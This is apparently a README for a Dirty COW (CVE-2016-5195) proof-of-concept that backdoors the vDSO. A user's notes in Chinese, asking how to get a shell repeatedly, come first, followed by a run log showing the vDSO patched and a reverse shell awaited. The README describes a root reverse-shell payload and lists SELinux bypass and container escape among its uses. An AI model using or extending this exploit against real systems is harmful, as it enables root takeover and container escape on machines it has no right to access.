
# ckx：想要改成多次可重复利用的版本

```
目前问题在于，该修复的都修复了，依旧无法反复get shell
同时，按理说不修复gettime的前几个字节的话，应该经常会有反弹shell打出来，但是并没有观察到这个现象也还是一次性只能打一个shell的这个问题
```

```
ckx@ckx:~/rr/dirtycow-vdso$ ./0xdeadbeef
[*] payload target: 127.0.0.1:1234
char in pre: e8
char in pre: 52
char in pre: 15
char in pre: 0
char in pre: 0
char in pre: 90
char in pre: 90
char in pre: f
char in pre: 31
char in pre: 48
char in pre: c1
char in pre: e2
ip in char: 7f
ip in char: 0
ip in char: 0
ip in char: 1
ip in char: 66
ip in char: c7
ip in char: 44
ip in char: 24
ip in char: 2
ip in char: 4
ip in char: d2
ip in char: c6
char: 55
char: 48
char: 89
char: e5
char: f
char: ae
char: e8
char: 90
found one
ckx: prologue size = 7
ckx: return ckxprologue!!
[*] exploit: patch 1/2
[*] vdso successfully backdoored
[*] exploit: patch 2/2
[*] vdso successfully backdoored
[*] waiting for reverse connect shell...
id
```


# 0xdeadbeef

PoC for [Dirty COW](http://dirtycow.ninja/) (CVE-2016-5195).

This PoC relies on ptrace (instead of `/proc/self/mem`) to patch vDSO. It has a
few advantages over PoCs modifying filesystem binaries:

- no setuid binary required
- SELinux bypass
- container escape
- no kernel crash because of filesystem writeback

And a few cons:

- architecture dependent (since the payload is written in assembly)
- doesn't work on every Linux version
- subject to vDSO changes


## Payload

The current payload is almost the same as in
[The Sea Watcher](https://github.com/scumjr/the-sea-watcher) and is executed
whenever a process makes a call to `clock_gettime()`. If the process has root
privileges and `/tmp/.x` doesn't exist, it forks, creates `/tmp/.x` and finally
creates a TCP reverse shell to the exploit. It isn't elegant but it could be
used for container escape.


## TODO

- payload improvement
- release of the tool for vDSO payloads testing

Detecting if vDSO is successfuly patched isn't bulletproof. During the *restore*
step, the vDSO is effectively restored but the exploit fails to report it
correctly. Indeed, the vDSO changes don't seem to affect the exploit process.
